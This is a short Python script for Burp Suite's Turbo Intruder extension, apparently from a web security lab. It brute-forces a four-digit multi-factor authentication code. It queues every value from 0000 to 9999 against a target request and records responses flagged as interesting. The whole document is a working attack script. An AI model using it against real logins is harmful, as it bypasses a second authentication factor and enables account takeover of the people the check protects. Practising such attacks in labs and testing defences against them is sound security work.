# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=10,
                           pipeline=False,
                           # engine=Engine.BURP
                           )

    for num in range(0, 10000):
        mfa_code = '{0:04}'.format(num)
        engine.queue(target.req, mfa_code.rstrip())



def handleResponse(req, interesting):
    if interesting:
        table.add(req)
